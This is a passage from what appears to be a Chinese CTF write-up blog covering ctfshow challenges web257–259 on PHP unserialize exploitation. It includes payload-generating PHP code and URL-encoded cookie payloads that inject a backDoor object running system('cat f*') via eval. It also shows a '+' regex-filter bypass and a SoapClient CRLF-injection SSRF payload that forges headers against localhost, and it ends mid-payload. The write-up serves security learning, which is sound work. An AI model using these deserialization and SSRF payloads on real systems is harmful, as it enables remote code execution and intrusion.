punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此题关键之处在于__destruct()在销毁对象时会自动调用getInfo()方法，而这时候的getInfo()方法有两个，一个在类info中。一个在backDoor中，我们需要的是利用反序列来将后者的被调用，也就是我们实例化的对象需要的是backDoor的属性所以需要将$this-&gt;class指向backDoor</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string">'backDoor'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string">'system("cat f*");'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//运行结果</span>O<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token string">"%00ctfShowUser%00class"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"backDoor"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token string">"backDoorcode"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string">"system("</span>cat f<span class="token operator">*</span><span class="token string">");"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>yn8rt<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">666</span>Cookie<span class="token punctuation">:</span>user<span class="token operator">=</span>O<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A18</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>00ctfShowUser<span class="token operator">%</span>00class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A14</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>00backDoor<span class="token operator">%</span>00code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A17</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>22cat<span class="token operator">+</span>f<span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多了一个正则表达式：<code>/[oc]:\d+:/i</code>。意思是过滤这两种情况：<code>o:数字:</code>与<code>c:数字:</code><br>这种情况是用<code>+(加号)</code>绕过的，如：<code>o:+</code></p><p><strong>构造：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string">'backDoor'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">backDoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">backDoor</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string">'system("cat f*");'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'O:'</span><span class="token punctuation">,</span><span class="token string">'O:+'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//运行结果</span>O<span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"ctfShowUser"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"class"</span><span class="token punctuation">;</span>O<span class="token punctuation">:</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"backDoor"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"code"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token string">"system("</span>cat f<span class="token operator">*</span><span class="token string">");"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//URL处理</span>O<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2B11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2B8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A17</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>22cat<span class="token operator">+</span>f<span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payload：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span>yn8rt<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">666</span>Cookie<span class="token punctuation">:</span>user<span class="token operator">=</span>O<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2B11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A5</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22class<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3BO</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2B8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22backDoor<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A1</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A17</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span>22cat<span class="token operator">+</span>f<span class="token operator">%</span><span class="token constant">2A</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3B</span><span class="token operator">%</span><span class="token constant">7D</span><span class="token operator">%</span><span class="token constant">7D</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="web259——SoapClient与CRLF组合拳"><a href="#web259——SoapClient与CRLF组合拳" class="headerlink" title="web259——SoapClient与CRLF组合拳"></a>web259——SoapClient与CRLF组合拳</h1><p>这跨度有点大</p><p><a href="https://y4tacker.blog.csdn.net/article/details/110521104" target="_blank" rel="noopener">从一道题学习SoapClient与CRLF组合拳</a></p><p><a href="https://www.cnblogs.com/studyskill/p/6972576.html" target="_blank" rel="noopener">新浪某站CRLF Injection导致的安全问题</a></p><p><a href="https://zhuanlan.zhihu.com/p/80918004" target="_blank" rel="noopener">SoapClient反序列化SSRF</a></p><p><strong>php中的内置类</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$classes</span> <span class="token operator">=</span> <span class="token function">get_declared_classes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$classes</span> <span class="token keyword">as</span> <span class="token variable">$class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token function">get_class_methods</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$methods</span> <span class="token keyword">as</span> <span class="token variable">$method</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span>           <span class="token string">'__destruct'</span><span class="token punctuation">,</span>           <span class="token string">'__toString'</span><span class="token punctuation">,</span>           <span class="token string">'__wakeup'</span><span class="token punctuation">,</span>           <span class="token string">'__call'</span><span class="token punctuation">,</span>           <span class="token string">'__callStatic'</span><span class="token punctuation">,</span>           <span class="token string">'__get'</span><span class="token punctuation">,</span>           <span class="token string">'__set'</span><span class="token punctuation">,</span>           <span class="token string">'__isset'</span><span class="token punctuation">,</span>           <span class="token string">'__unset'</span><span class="token punctuation">,</span>           <span class="token string">'__invoke'</span><span class="token punctuation">,</span>           <span class="token string">'__set_state'</span>       <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">print</span> <span class="token variable">$class</span> <span class="token class-name"><span class="token punctuation">.</span></span> <span class="token string">'::'</span> <span class="token punctuation">.</span> <span class="token variable">$method</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个版本内置类的数量是不一样的，所以没有找到SoapClient <code>__call</code>方法但是按照道理来说，其应该是确实存在的！</p><p><strong>题目</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//vip can get flag one key</span><span class="token variable">$vip</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>提示：flag.php</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为是php不是python想要连接web service就不能简单的像python导入个requests包就可以了，在php中是需要利用soapclient来请求的！</p><p><a href="https://blog.csdn.net/xin_king/article/details/8720492" target="_blank" rel="noopener">php soapclient的使用</a></p><p><strong>payload：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$target</span> <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//127.0.0.1/flag.php';</span><span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string">'token=ctfshow'</span><span class="token punctuation">;</span><span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">'X-Forwarded-For: 127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1,127.0.0.1'</span><span class="token punctuation">,</span>    <span class="token string">'UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'location'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string">'user_agent'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'yn8rt^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^Content-Length: '</span><span class="token punctuation">.</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'^^^^'</span><span class="token punctuation">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string">'uri'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^^'</span><span class="token punctuation">,</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//运行结果</span>O<span class="token operator">%</span><span class="token constant">3A10</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22SoapClient<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>7Bs<span class="token operator">%</span><span class="token constant">3A3</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22uri<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A4</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22aaab<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A8</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22location<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A25</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22http<span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span><span class="token constant">2F</span><span class="token operator">%</span><span class="token constant">2F127</span><span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">%</span>2Fflag<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A11</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22_user_agent<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>3Bs<span class="token operator">%</span><span class="token constant">3A235</span><span class="token operator">%</span><span class="token constant">3A</span><span class="token operator">%</span>22yn8rt<span class="token operator">%</span><span class="token constant">0D</span><span class="token operator">%</span>0AContent<span class="token operator">-</span>Type<span class="token operator">%</span><span class="token 